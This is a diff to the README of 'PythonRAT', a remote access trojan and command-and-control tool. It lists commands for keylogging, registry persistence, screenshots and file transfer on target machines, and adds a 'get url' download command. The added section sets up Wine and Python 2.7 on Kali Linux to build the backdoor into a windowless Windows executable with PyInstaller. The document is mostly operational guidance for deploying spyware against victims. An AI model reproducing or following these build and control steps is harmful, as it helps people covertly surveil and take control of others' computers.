@@ -40,19 +40,48 @@ PythonRAT is a Command and Control (C2) server which can control multiple machin
     cd *Directory name*                 --> Changes Directory On Target System
     upload *file name*                  --> Upload File To The Target Machine From Working Dir 
     download *file name*                --> Download File From Target Machine
+    get *url*                           --> Download File From Specified URL
     keylog_start                        --> Start The Keylogger
     keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
     keylog_stop                         --> Stop And Self Destruct Keylogger File
     persistence *RegName* *filename*    --> Create Persistence In Registry
     screenshot                          --> Takes screenshot and sends to server ./screenshots/
-    remove_backdoor                     --> Removes backdoor from target
+    remove_backdoor                     --> Removes backdoor from target!!!
+
+# Wine and Pyinstaller (Win version) Installation on Linux
+
+Python 2.7.14 Releases: https://www.python.org/downloads/release/python-2714/
+
+**Environment Setup**
+
+┌──(root💀kali)-[~/]
+
+└─# 
+    sudo su
+    
+    dpkg --add-architecture i386
+    apt update
+    apt install wine32 
+    wget https://www.python.org/ftp/python/2.7.14/python-2.7.14.msi
+    sudo wine msiexec -i ~/python-2.7.14.msi #x86 arch
+    
+    
+**Installing Dependencies**
+
+┌──(root💀kali)-[~/.wine/drive_c]
+
+└─# 
+
+    cd /root/.wine/drive_c/Python27
+    wine python.exe -m pip install  pyinstaller
+                                    requests
+                                    pyautogui
 
 
 # Backdoor Compilation and Obfuscation for Windows
 
 **Compile to Executable using Pyinstaller**
 
-    $ pip install pyinstaller
     $ pyinstaller --onefile --noconsole backdoor.py
     
 This will produce _./dist/backdoor.exe_
